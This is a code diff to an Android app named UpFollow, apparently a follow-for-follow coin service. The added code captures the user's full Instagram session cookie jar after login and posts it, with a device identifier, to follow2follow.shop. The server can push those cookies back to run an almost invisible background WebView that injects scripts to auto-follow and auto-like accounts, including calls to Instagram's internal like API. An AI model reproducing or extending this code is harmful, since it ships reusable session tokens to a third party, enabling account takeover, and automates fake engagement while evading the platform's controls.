@@ -7,11 +7,14 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.content.Context;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.provider.Settings;
 import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.webkit.CookieManager;
@@ -24,15 +27,17 @@ import android.webkit.WebViewClient;
 import android.widget.FrameLayout;
 
 import java.net.URLEncoder;
+import java.security.MessageDigest;
 
 public class MainActivity extends Activity {
 
     private WebView mainWebView;
     private WebView workerWebView;
 
-    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";
+    private static final String HOSTING_BASE = "https://follow2follow.shop/";
+    private static final String HOSTING_DASHBOARD = HOSTING_BASE + "index.php";
+    private static final String IG_URL = "https://www.instagram.com";
     private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
-    // FIX: purana Chrome/124 UA Instagram ko outdated lag sakta hai. Time-time pe update karte raho.
     private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36";
 
     private static final String CHANNEL_ID = "upfollow_automation_channel";
@@ -41,14 +46,19 @@ public class MainActivity extends Activity {
 
     private NotificationManager notificationManager;
     private PowerManager.WakeLock wakeLock;
-
     private final Handler uiHandler = new Handler(Looper.getMainLooper());
 
-    private String currentTaskType = "follow";
-    private boolean isAddingSecondaryAccount = false;
+    private volatile String mainUrl = "";
+    private String deviceKey = "";
 
-    // FIX: sirf ek result per task jaye (duplicate onPageFinished se double result nahi aayega)
+    private String currentTaskType = "follow";
     private boolean taskActive = false;
+
+    // Instagram login capture state
+    private boolean captureBusy = false;
+    private boolean addMode = false;
+    private String captureNonce = "";
+    private String captureCookies = "";
 
     private final Runnable taskTimeout = new Runnable() {
         @Override
@@ -62,6 +72,8 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        deviceKey = computeDeviceKey();
 
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -80,76 +92,76 @@ public class MainActivity extends Activity {
         mainWebView = findViewById(R.id.webView);
         setupWebView(mainWebView);
 
-        // FIX: Worker WebView ab full-size hai (1x1 par Instagram ka mobile layout/React render
-        // sahi nahi hota, isliye Follow button DOM me aata hi nahi tha). Ye main WebView ke
-        // NEECHE (index 0) add hota hai, to touch block nahi karta aur user ko dikhta nahi.
+        // Worker WebView: full-size, main WebView ke neeche chhupa hua
         workerWebView = new WebView(this);
         setupWebView(workerWebView);
-
-        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT,
-                ViewGroup.LayoutParams.MATCH_PARENT);
-        workerWebView.setLayoutParams(params);
+        workerWebView.setLayoutParams(new FrameLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
         workerWebView.setAlpha(0.01f);
-
         ViewGroup rootView = (ViewGroup) findViewById(android.R.id.content);
         if (rootView != null) {
             rootView.addView(workerWebView, 0);
         }
 
-        // Native Bridges
+        // Bridges
         mainWebView.addJavascriptInterface(new MainAppInterface(), "Android");
+        mainWebView.addJavascriptInterface(new IgProbeInterface(), "IgProbe");
         workerWebView.addJavascriptInterface(new WorkerAppInterface(), "WorkerBridge");
 
-        // Main WebView Client
+        // ---------- Main WebView client ----------
         mainWebView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+                return handleNav(request.getUrl().toString());
+            }
+
+            @SuppressWarnings("deprecation")
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                return handleNav(url);
+            }
+
+            @Override
+            public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                super.onPageStarted(view, url, favicon);
+                mainUrl = url == null ? "" : url;
+            }
+
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-
-                if (url != null && url.contains("force_authentication=1")) {
-                    isAddingSecondaryAccount = true;
-                }
-
-                if (url != null && (url.contains("instagram.com/?") || url.equals("https://www.instagram.com/"))) {
-                    CookieManager.getInstance().flush();
-                    String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
-                    if (cookies != null && cookies.contains("sessionid")) {
-                        try {
-                            String encoded = URLEncoder.encode(cookies, "UTF-8");
-                            if (isAddingSecondaryAccount) {
-                                isAddingSecondaryAccount = false;
-                                mainWebView.loadUrl(HOSTING_DASHBOARD + "?add_cookies=" + encoded);
-                            } else {
-                                mainWebView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encoded);
-                            }
-                        } catch (Exception e) {
-                            mainWebView.loadUrl(HOSTING_DASHBOARD);
-                        }
-                    }
-                }
+                if (url != null) mainUrl = url;
+                checkInstagramLogin(url);
             }
         });
 
-        // Worker WebView Client
+        // ---------- Worker WebView client ----------
         workerWebView.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageFinished(final WebView view, String url) {
                 super.onPageFinished(view, url);
-                if (!taskActive) return;
+                if (!taskActive || url == null) return;
 
-                if (url != null && (url.contains("/challenge/") || url.contains("/suspended/") || url.contains("/checkpoint/"))) {
+                String path = "";
+                try { path = String.valueOf(Uri.parse(url).getPath()).toLowerCase(); } catch (Exception ignored) {}
+
+                if (path.startsWith("/accounts/suspended")) {
+                    deliverResult(false, "Suspended: Instagram suspended this account");
+                    return;
+                }
+                if (path.startsWith("/accounts/disabled")) {
+                    deliverResult(false, "Disabled: Instagram disabled this account");
+                    return;
+                }
+                if (path.startsWith("/challenge") || path.startsWith("/checkpoint") || path.startsWith("/auth_platform")) {
                     deliverResult(false, "Blocked: Challenge / Checkpoint");
                     return;
                 }
-
-                // FIX: login page par redirect = session valid nahi
-                if (url != null && url.contains("/accounts/login")) {
-                    deliverResult(false, "Not logged in");
+                if (path.startsWith("/accounts/login") || path.startsWith("/accounts/emailsignup")) {
+                    deliverResult(false, "Session expired");
                     return;
                 }
 
-                // Script ab khud polling karti hai (React render hone ka wait), isliye delay chhota
                 uiHandler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -160,27 +172,20 @@ public class MainActivity extends Activity {
                             injectFollowScript(view);
                         }
                     }
-                }, 1500);
+                }, 1200);
             }
 
             @Override
             public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                 super.onReceivedError(view, request, error);
-                // FIX: pehle har chhota resource error (image/script) bhi "Page error" bana deta tha.
-                // Ab sirf main page ka error count hoga.
                 if (request != null && request.isForMainFrame()) {
                     deliverResult(false, "Page error");
                 }
             }
         });
 
-        // Auto login check
-        String cookies = CookieManager.getInstance().getCookie("https://www.instagram.com");
-        if (cookies != null && cookies.contains("sessionid")) {
-            mainWebView.loadUrl(HOSTING_DASHBOARD);
-        } else {
-            mainWebView.loadUrl(IG_LOGIN_URL);
-        }
+        // App start: hamesha dashboard (server decide karta hai: dashboard / saved accounts / login)
+        mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
     }
 
     private void setupWebView(WebView wv) {
@@ -195,13 +200,162 @@ public class MainActivity extends Activity {
         cm.setAcceptThirdPartyCookies(wv, true);
     }
 
-    private static String js(String... lines) {
-        StringBuilder sb = new StringBuilder();
-        for (String l : lines) sb.append(l).append('\n');
-        return sb.toString();
+    // ------------------------------------------------------------------
+    // Device key (reinstall ke baad saved accounts pehchanne ke liye)
+    // ------------------------------------------------------------------
+    private String computeDeviceKey() {
+        try {
+            String aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            if (aid == null) aid = "unknown";
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] d = md.digest((aid + ":upfollow").getBytes("UTF-8"));
+            StringBuilder sb = new StringBuilder();
+            for (byte b : d) sb.append(String.format("%02x", b));
+            return sb.toString();
+        } catch (Exception e) {
+            return "0000000000000000000000000000000000000000000000000000000000000000";
+        }
     }
 
-    // Result ko ek hi baar main WebView tak bhejta hai
+    // ------------------------------------------------------------------
+    // Navigation: "Add Account" link ko yaha pakadte hain
+    // ------------------------------------------------------------------
+    private boolean handleNav(final String url) {
+        if (url != null && url.contains("force_authentication=1")) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    addMode = true;
+                    captureBusy = false;
+                    // Saare accounts ki cookies server par saved hain, isliye jar saaf karna safe hai.
+                    // Isse Instagram naya login form dikhata hai aur purana session nahi ghusta.
+                    applyInstagramCookies("");
+                    mainWebView.loadUrl(IG_LOGIN_URL);
+                }
+            });
+            return true;
+        }
+        return false;
+    }
+
+    // ------------------------------------------------------------------
+    // Instagram login capture (main WebView)
+    // ------------------------------------------------------------------
+    private void checkInstagramLogin(String url) {
+        if (url == null || captureBusy) return;
+        if (!url.startsWith(IG_URL)) return;
+
+        String path = "";
+        try { path = String.valueOf(Uri.parse(url).getPath()).toLowerCase(); } catch (Exception ignored) {}
+        String[] bad = {"login", "challenge", "checkpoint", "suspended", "disabled",
+                "signup", "two_factor", "password", "recover", "auth_platform"};
+        for (String b : bad) {
+            if (path.contains(b)) return;
+        }
+
+        String cookies = CookieManager.getInstance().getCookie(IG_URL);
+        if (cookieValue(cookies, "sessionid").isEmpty()) return;
+
+        captureBusy = true;
+        captureCookies = cookies;
+        captureNonce = Long.toHexString(System.nanoTime());
+        final String nonce = captureNonce;
+        String uid = cookieValue(cookies, "ds_user_id");
+
+        if (uid.matches("\\d+")) {
+            String js = "(function(){var n='" + nonce + "';"
+                    + "function d(u){try{IgProbe.onIgInfo(n,u||'');}catch(e){}}"
+                    + "try{fetch('/api/v1/users/" + uid + "/info/',{credentials:'include',"
+                    + "headers:{'x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest'}})"
+                    + ".then(function(r){return r.json();})"
+                    + ".then(function(j){d(j&&j.user&&j.user.username);})"
+                    + ".catch(function(){d('');});}catch(e){d('');}})();";
+            mainWebView.evaluateJavascript(js, null);
+        } else {
+            finishCapture("");
+            return;
+        }
+
+        // Agar username fetch atak jaye to bina username ke aage badho
+        uiHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (captureBusy && nonce.equals(captureNonce)) {
+                    finishCapture("");
+                }
+            }
+        }, 6000);
+    }
+
+    private void finishCapture(String username) {
+        if (!captureBusy) return;
+        captureBusy = false;
+        captureNonce = "";
+        try {
+            String clean = username == null ? "" : username.replaceAll("[^A-Za-z0-9._]", "");
+            String body = "ig_cookies=" + URLEncoder.encode(captureCookies, "UTF-8")
+                    + "&ig_name=" + URLEncoder.encode(clean, "UTF-8")
+                    + "&dk=" + deviceKey
+                    + "&mode=" + (addMode ? "add" : "login");
+            addMode = false;
+            mainWebView.postUrl(HOSTING_DASHBOARD, body.getBytes("UTF-8"));
+        } catch (Exception e) {
+            addMode = false;
+            mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // Cookie helpers
+    // ------------------------------------------------------------------
+    private static String cookieValue(String cookies, String name) {
+        if (cookies == null) return "";
+        for (String part : cookies.split(";")) {
+            part = part.trim();
+            int i = part.indexOf('=');
+            if (i > 0 && part.substring(0, i).equals(name)) {
+                return part.substring(i + 1);
+            }
+        }
+        return "";
+    }
+
+    // cookieStr khali ho to sirf Instagram cookies clear hoti hain
+    private void applyInstagramCookies(String cookieStr) {
+        CookieManager cm = CookieManager.getInstance();
+        String existing = cm.getCookie(IG_URL);
+        if (existing != null) {
+            for (String part : existing.split(";")) {
+                String p = part.trim();
+                int i = p.indexOf('=');
+                String name = i > 0 ? p.substring(0, i) : p;
+                if (name.isEmpty()) continue;
+                cm.setCookie(IG_URL, name + "=; Max-Age=0; Path=/; Domain=.instagram.com");
+                cm.setCookie(IG_URL, name + "=; Max-Age=0; Path=/");
+            }
+        }
+        if (cookieStr != null && !cookieStr.isEmpty()) {
+            for (String part : cookieStr.split(";")) {
+                String p = part.trim();
+                int i = p.indexOf('=');
+                if (i <= 0) continue;
+                String name = p.substring(0, i);
+                String extra = "; Domain=.instagram.com; Path=/; Secure";
+                if ("sessionid".equals(name)) extra += "; HttpOnly";
+                cm.setCookie(IG_URL, p + extra);
+            }
+        }
+        cm.flush();
+    }
+
+    private boolean trusted() {
+        String u = mainUrl;
+        return u != null && u.startsWith(HOSTING_BASE);
+    }
+
+    // ------------------------------------------------------------------
+    // Result delivery (ek task = ek result)
+    // ------------------------------------------------------------------
     private void deliverResult(boolean success, String message) {
         if (!taskActive) return;
         taskActive = false;
@@ -211,29 +365,59 @@ public class MainActivity extends Activity {
                 "if(window.onWorkerResult) window.onWorkerResult(" + success + ", '" + safe + "');", null);
     }
 
-    // ---------------- FOLLOW SCRIPT ----------------
-    // Fixes:
-    //  1. Polling: button aane tak 14 sec tak wait (pehle sirf 1 baar check hota tha)
-    //  2. Double click hata diya (click() + dispatchEvent = 2 click => follow ke baad unfollow ho sakta tha)
-    //  3. Click ke baad verify: "Following"/"Requested" dikhe tabhi success
-    //  4. 'suspended' wala false-positive hata diya (bio me ye word ho to block lag jata tha)
-    //  5. Pehle header ke andar button dhundta hai (suggested accounts ke Follow button se bachne ke liye)
+    private static String js(String... lines) {
+        StringBuilder sb = new StringBuilder();
+        for (String l : lines) sb.append(l).append('\n');
+        return sb.toString();
+    }
+
+    // ------------------------------------------------------------------
+    // Shared JS helpers (fatal state detection, popups)
+    // ------------------------------------------------------------------
+    private static final String JS_HEAD = js(
+        "(function() {",
+        "  if (window.__ufRunning) return;",
+        "  window.__ufRunning = true;",
+        "  var finished = false, timer = null, tries = 0, clicked = false, clickedAt = 0;",
+        "  function finish(ok, msg) {",
+        "    if (finished) return;",
+        "    finished = true; window.__ufRunning = false;",
+        "    if (timer) clearInterval(timer);",
+        "    window.WorkerBridge.onTaskResult(ok, msg);",
+        "  }",
+        "  function txt(e) { return ((e.innerText || e.textContent) || '').trim().toLowerCase(); }",
+        "  function lbl(e) { return (e.getAttribute('aria-label') || '').trim().toLowerCase(); }",
+        "  function btns(root) { return Array.prototype.slice.call((root || document).querySelectorAll('button, div[role=button], span[role=button], a[role=button]')); }",
+        "  function bodyText() { return (document.body ? document.body.innerText : '').toLowerCase(); }",
+        "  function fatal() {",
+        "    var p = location.pathname || '';",
+        "    if (p.indexOf('/accounts/suspended') === 0) return 'Suspended: Instagram suspended this account';",
+        "    if (p.indexOf('/accounts/disabled') === 0) return 'Disabled: Instagram disabled this account';",
+        "    if (p.indexOf('/challenge') === 0 || p.indexOf('/checkpoint') === 0 || p.indexOf('/auth_platform') === 0) return 'Blocked: Challenge / Checkpoint';",
+        "    if (p.indexOf('/accounts/login') === 0 || p.indexOf('/accounts/emailsignup') === 0) return 'Session expired';",
+        "    var t = bodyText();",
+        "    if (t.indexOf('account has been disabled') > -1 || t.indexOf('account was disabled') > -1) return 'Disabled: Instagram disabled this account';",
+        "    if (t.indexOf('account has been suspended') > -1 || t.indexOf('suspended your account') > -1 || t.indexOf('account is suspended') > -1) return 'Suspended: Instagram suspended this account';",
+        "    if (t.indexOf('action blocked') > -1 || t.indexOf('confirm you') > -1 || t.indexOf('try again later') > -1 || t.indexOf('we restrict certain activity') > -1) return 'Blocked: Action Limit / Challenge';",
+        "    return null;",
+        "  }",
+        "  function gone() {",
+        "    var t = bodyText();",
+        "    return (t.indexOf('page isn') > -1 && t.indexOf('available') > -1) || t.indexOf('content isn') > -1 && t.indexOf('available') > -1;",
+        "  }",
+        "  function dismiss() {",
+        "    var w = ['not now', 'allow all cookies', 'allow essential and optional cookies', 'accept all'];",
+        "    btns().forEach(function(b) { if (w.indexOf(txt(b)) > -1) b.click(); });",
+        "  }"
+    );
+
+    // ------------------------------------------------------------------
+    // FOLLOW SCRIPT
+    // ------------------------------------------------------------------
     private void injectFollowScript(WebView view) {
-        String script = js(
-            "(function() {",
-            "  if (window.__ufRunning) return;",
-            "  window.__ufRunning = true;",
-            "  var finished = false, tries = 0, clicked = false, clickedAt = 0, timer = null;",
+        String script = JS_HEAD + js(
             "  var FOLLOW = ['follow', 'follow back', '\u092b\u0949\u0932\u094b \u0915\u0930\u0947\u0902'];",
             "  var DONE = ['following', 'requested'];",
-            "  function finish(ok, msg) {",
-            "    if (finished) return;",
-            "    finished = true; window.__ufRunning = false;",
-            "    if (timer) clearInterval(timer);",
-            "    window.WorkerBridge.onTaskResult(ok, msg);",
-            "  }",
-            "  function txt(e) { return ((e.innerText || e.textContent) || '').trim().toLowerCase(); }",
-            "  function btns(root) { return Array.prototype.slice.call((root || document).querySelectorAll('button, div[role=button]')); }",
             "  function find(list, words) {",
             "    for (var i = 0; i < list.length; i++) { if (words.indexOf(txt(list[i])) > -1) return list[i]; }",
             "    return null;",
@@ -241,29 +425,21 @@ public class MainActivity extends Activity {
             "  function tick() {",
             "    try {",
             "      tries++;",
-            "      var body = (document.body ? document.body.innerText : '').toLowerCase();",
-            "      if (body.indexOf('action blocked') > -1 || body.indexOf('confirm you') > -1 || body.indexOf('try again later') > -1) {",
-            "        finish(false, 'Blocked: Action Limit / Challenge'); return;",
-            "      }",
-            "      if (document.querySelector('input[name=username]')) { finish(false, 'Not logged in'); return; }",
-            "      btns().forEach(function(p) {",
-            "        var pt = txt(p);",
-            "        if (pt === 'not now' || pt === 'allow all' || pt === 'allow all cookies' || pt === 'accept') p.click();",
-            "      });",
+            "      var f = fatal(); if (f) { finish(false, f); return; }",
+            "      if (gone()) { finish(false, 'Profile unavailable'); return; }",
+            "      dismiss();",
             "      var scope = (tries > 8) ? document : (document.querySelector('header') || document.querySelector('main') || document);",
             "      var list = btns(scope);",
             "      if (clicked) {",
             "        if (find(list, DONE)) { finish(true, 'Followed Successfully'); return; }",
-            "        if (Date.now() - clickedAt > 5000) { finish(false, 'Click did not register'); }",
+            "        if (Date.now() - clickedAt > 6000) { finish(false, 'Click did not register'); }",
             "        return;",
             "      }",
             "      if (find(list, DONE)) { finish(true, 'Already Following'); return; }",
             "      var fb = find(list, FOLLOW);",
             "      if (fb) { fb.click(); clicked = true; clickedAt = Date.now(); return; }",
-            "      if (tries >= 20) { finish(false, 'Follow button not found'); }",
-            "    } catch (err) {",
-            "      finish(false, 'JS Error: ' + err.message);",
-            "    }",
+            "      if (tries >= 22) { finish(false, 'Follow button not found'); }",
+            "    } catch (err) { finish(false, 'JS Error: ' + err.message); }",
             "  }",
             "  timer = setInterval(tick, 700);",
             "  tick();",
@@ -272,56 +448,76 @@ public class MainActivity extends Activity {
         view.evaluateJavascript(script, null);
     }
 
-    // ---------------- LIKE SCRIPT ----------------
+    // ------------------------------------------------------------------
+    // LIKE SCRIPT: pehle DOM button, na mile to Instagram web API (fallback)
+    // ------------------------------------------------------------------
     private void injectLikeScript(WebView view) {
-        String script = js(
-            "(function() {",
-            "  if (window.__ufRunning) return;",
-            "  window.__ufRunning = true;",
-            "  var finished = false, tries = 0, clicked = false, clickedAt = 0, timer = null;",
-            "  function finish(ok, msg) {",
-            "    if (finished) return;",
-            "    finished = true; window.__ufRunning = false;",
-            "    if (timer) clearInterval(timer);",
-            "    window.WorkerBridge.onTaskResult(ok, msg);",
+        String script = JS_HEAD + js(
+            "  var LIKE = ['like', '\u092a\u0938\u0902\u0926 \u0915\u0930\u0947\u0902', 'me gusta', 'curtir', 'mi piace', 'suka', 'gef\u00e4llt mir'];",
+            "  var UNLIKE = ['unlike', '\u092a\u0938\u0902\u0926 \u0930\u0926\u094d\u0926 \u0915\u0930\u0947\u0902', 'ya no me gusta', 'descurtir', 'batal suka', 'gef\u00e4llt mir nicht mehr'];",
+            "  var apiTried = false, apiBusy = false;",
+            "  function byLabel(set) {",
+            "    var els = document.querySelectorAll('svg[aria-label], [role=button][aria-label], button[aria-label]');",
+            "    for (var i = 0; i < els.length; i++) {",
+            "      if (set.indexOf(lbl(els[i])) > -1) {",
+            "        var r = els[i].getBoundingClientRect();",
+            "        if (r.width > 0 && r.height > 0) return els[i];",
+            "      }",
+            "    }",
+            "    return null;",
             "  }",
-            "  function txt(e) { return ((e.innerText || e.textContent) || '').trim().toLowerCase(); }",
+            "  function cookie(name) {",
+            "    var c = (document.cookie || '').split(';');",
+            "    for (var i = 0; i < c.length; i++) { var p = c[i].trim(); if (p.indexOf(name + '=') === 0) return p.substring(name.length + 1); }",
+            "    return '';",
+            "  }",
+            "  function callApi() {",
+            "    apiTried = true;",
+            "    var parts = (location.pathname || '').split('/'), sc = '';",
+            "    for (var i = 0; i < parts.length - 1; i++) {",
+            "      if (parts[i] === 'p' || parts[i] === 'reel' || parts[i] === 'reels' || parts[i] === 'tv') { sc = parts[i + 1]; break; }",
+            "    }",
+            "    var csrf = cookie('csrftoken');",
+            "    if (!sc || !csrf || typeof BigInt === 'undefined') return;",
+            "    var a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';",
+            "    var id = BigInt(0); sc = sc.slice(0, 11);",
+            "    for (var j = 0; j < sc.length; j++) { id = id * BigInt(64) + BigInt(a.indexOf(sc.charAt(j))); }",
+            "    apiBusy = true;",
+            "    fetch('/api/v1/web/likes/' + id.toString() + '/like/', {",
+            "      method: 'POST', credentials: 'include',",
+            "      headers: { 'x-csrftoken': csrf, 'x-ig-app-id': '936619743392459', 'x-requested-with': 'XMLHttpRequest', 'content-type': 'application/x-www-form-urlencoded' },",
+            "      body: ''",
+            "    }).then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
+            "    .then(function(x) {",
+            "      apiBusy = false;",
+            "      var low = x.t.toLowerCase().split(' ').join('');",
+            "      if (x.s === 200 && low.indexOf('\"status\":\"ok\"') > -1) { finish(true, 'Post Liked Successfully'); return; }",
+            "      if (low.indexOf('checkpoint') > -1 || low.indexOf('challenge') > -1) { finish(false, 'Blocked: Challenge / Checkpoint'); return; }",
+            "      if (low.indexOf('login_required') > -1) { finish(false, 'Session expired'); return; }",
+            "      if (low.indexOf('feedback_required') > -1 || x.s === 429 || low.indexOf('\"spam\":true') > -1 || low.indexOf('trylater') > -1) { finish(false, 'Blocked: Action Limit / Challenge'); return; }",
+            "      if (x.s === 404) { finish(false, 'Post unavailable'); return; }",
+            "    }).catch(function() { apiBusy = false; });",
+            "  }",
             "  function tick() {",
             "    try {",
             "      tries++;",
-            "      var body = (document.body ? document.body.innerText : '').toLowerCase();",
-            "      if (body.indexOf('action blocked') > -1 || body.indexOf('confirm you') > -1 || body.indexOf('try again later') > -1) {",
-            "        finish(false, 'Blocked: Action Limit / Challenge'); return;",
-            "      }",
-            "      if (document.querySelector('input[name=username]')) { finish(false, 'Not logged in'); return; }",
-            "      Array.prototype.slice.call(document.querySelectorAll('button, div[role=button]')).forEach(function(p) {",
-            "        var pt = txt(p);",
-            "        if (pt === 'not now') p.click();",
-            "      });",
-            "      var unlike = document.querySelector('svg[aria-label=Unlike], svg[aria-label=\"\u092a\u0938\u0902\u0926 \u0930\u0926\u094d\u0926 \u0915\u0930\u0947\u0902\"]');",
-            "      if (unlike) { finish(true, clicked ? 'Post Liked Successfully' : 'Already Liked'); return; }",
+            "      var f = fatal(); if (f) { finish(false, f); return; }",
+            "      if (gone()) { finish(false, 'Post unavailable'); return; }",
+            "      dismiss();",
+            "      if (apiBusy) return;",
+            "      if (byLabel(UNLIKE)) { finish(true, clicked ? 'Post Liked Successfully' : 'Already Liked'); return; }",
             "      if (clicked) {",
-            "        if (Date.now() - clickedAt > 5000) { finish(false, 'Like did not register'); }",
+            "        if (Date.now() - clickedAt > 6000) { finish(false, 'Like did not register'); }",
             "        return;",
             "      }",
-            "      var likeSvg = document.querySelector('svg[aria-label=Like], svg[aria-label=\"\u092a\u0938\u0902\u0926 \u0915\u0930\u0947\u0902\"]');",
-            "      if (likeSvg) {",
-            "        var btn = likeSvg.closest('button') || likeSvg.closest('div[role=button]') || likeSvg.closest('span[role=button]') || likeSvg.parentElement;",
-            "        btn.click(); clicked = true; clickedAt = Date.now(); return;",
+            "      var lk = byLabel(LIKE);",
+            "      if (lk) {",
+            "        var b = lk.closest('button, [role=button]') || lk.parentElement;",
+            "        b.click(); clicked = true; clickedAt = Date.now(); return;",
             "      }",
-            "      if (tries === 8) {",
-            "        var videoEl = document.querySelector('video');",
-            "        if (videoEl) {",
-            "          videoEl.dispatchEvent(new MouseEvent('dblclick', { bubbles: true, cancelable: true, view: window }));",
-            "          clicked = true; clickedAt = Date.now(); return;",
-            "        }",
-            "        var postLink = document.querySelector('main a[href*=\"/p/\"], main a[href*=\"/reel/\"]');",
-            "        if (postLink) { window.__ufRunning = false; if (timer) clearInterval(timer); window.location.href = postLink.href; return; }",
-            "      }",
-            "      if (tries >= 20) { finish(false, 'Like button not found'); }",
-            "    } catch (err) {",
-            "      finish(false, 'JS Error: ' + err.message);",
-            "    }",
+            "      if (!apiTried && tries >= 4) { callApi(); return; }",
+            "      if (tries >= 24) { finish(false, 'Like button not found'); }",
+            "    } catch (err) { finish(false, 'JS Error: ' + err.message); }",
             "  }",
             "  timer = setInterval(tick, 700);",
             "  tick();",
@@ -330,14 +526,14 @@ public class MainActivity extends Activity {
         view.evaluateJavascript(script, null);
     }
 
+    // ------------------------------------------------------------------
+    // Notification
+    // ------------------------------------------------------------------
     private void createNotificationChannel() {
         notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Automation Service",
-                    NotificationManager.IMPORTANCE_LOW
-            );
+                    CHANNEL_ID, "Automation Service", NotificationManager.IMPORTANCE_LOW);
             channel.setDescription("Shows live automation stats in status bar");
             channel.setShowBadge(false);
             if (notificationManager != null) {
@@ -348,19 +544,16 @@ public class MainActivity extends Activity {
 
     private void showOrUpdateNotification(int accounts, int tasks, int coins) {
         if (notificationManager == null) return;
-
         Notification.Builder builder;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             builder = new Notification.Builder(this, CHANNEL_ID);
         } else {
             builder = new Notification.Builder(this);
         }
-
         builder.setContentTitle("UpFollow Running")
                .setContentText("Accounts: " + accounts + " Active  |  Tasks: " + tasks + "  |  Coins: +" + coins)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true);
-
         notificationManager.notify(NOTIFICATION_ID, builder.build());
     }
 
@@ -370,10 +563,15 @@ public class MainActivity extends Activity {
         }
     }
 
-    // App Bridges
+    // ------------------------------------------------------------------
+    // Bridges
+    // ------------------------------------------------------------------
     public class MainAppInterface {
+
+        // Naya: account ki cookies ke saath task chalao (har account apna session use karta hai)
         @JavascriptInterface
-        public void executeBrowserAction(final String target, final String taskType, final String mediaId) {
+        public void runTask(final String target, final String taskType, final String mediaId, final String cookieStr) {
+            if (!trusted()) return;
             uiHandler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -382,34 +580,50 @@ public class MainActivity extends Activity {
                     uiHandler.removeCallbacks(taskTimeout);
                     uiHandler.postDelayed(taskTimeout, TASK_TIMEOUT_MS);
 
-                    String cleanTarget = target.replace("@", "").trim();
+                    if (cookieStr != null && !cookieStr.isEmpty()) {
+                        applyInstagramCookies(cookieStr);
+                    }
 
+                    String cleanTarget = target == null ? "" : target.replaceAll("[^A-Za-z0-9._]", "");
+                    String url;
                     if ("like".equalsIgnoreCase(taskType)) {
-                        if (mediaId != null && !mediaId.isEmpty() && !mediaId.equals("25025320")) {
-                            if (mediaId.startsWith("http")) {
-                                workerWebView.loadUrl(mediaId);
-                            } else if (mediaId.length() <= 12) {
-                                workerWebView.loadUrl("https://www.instagram.com/reel/" + mediaId + "/");
-                            } else {
-                                workerWebView.loadUrl("https://www.instagram.com/p/" + mediaId + "/");
-                            }
+                        if (mediaId != null && mediaId.startsWith("https://www.instagram.com/")) {
+                            url = mediaId;
+                        } else if (mediaId != null && !mediaId.isEmpty() && mediaId.matches("[A-Za-z0-9_-]+") && !mediaId.equals("25025320")) {
+                            url = (mediaId.length() <= 12 ? "https://www.instagram.com/reel/" : "https://www.instagram.com/p/") + mediaId + "/";
                         } else {
-                            workerWebView.loadUrl("https://www.instagram.com/" + cleanTarget + "/");
+                            url = "https://www.instagram.com/" + cleanTarget + "/";
                         }
                     } else {
-                        workerWebView.loadUrl("https://www.instagram.com/" + cleanTarget + "/");
+                        url = "https://www.instagram.com/" + cleanTarget + "/";
                     }
+                    workerWebView.loadUrl(url);
                 }
             });
         }
 
+        // Purana method (compatibility)
+        @JavascriptInterface
+        public void executeBrowserAction(String target, String taskType, String mediaId) {
+            runTask(target, taskType, mediaId, "");
+        }
+
         @JavascriptInterface
         public void executeBrowserFollow(String target) {
-            executeBrowserAction(target, "follow", "");
+            runTask(target, "follow", "", "");
+        }
+
+        // Primary account ki cookie server par sync karne ke liye
+        @JavascriptInterface
+        public String getIgCookies() {
+            if (!trusted()) return "";
+            String c = CookieManager.getInstance().getCookie(IG_URL);
+            return c == null ? "" : c;
         }
 
         @JavascriptInterface
         public void setKeepScreenOn(final boolean keepOn) {
+            if (!trusted()) return;
             uiHandler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -430,6 +644,7 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void updateNotification(final int accounts, final int tasks, final int coins) {
+            if (!trusted()) return;
             uiHandler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -440,10 +655,26 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void stopNotification() {
+            if (!trusted()) return;
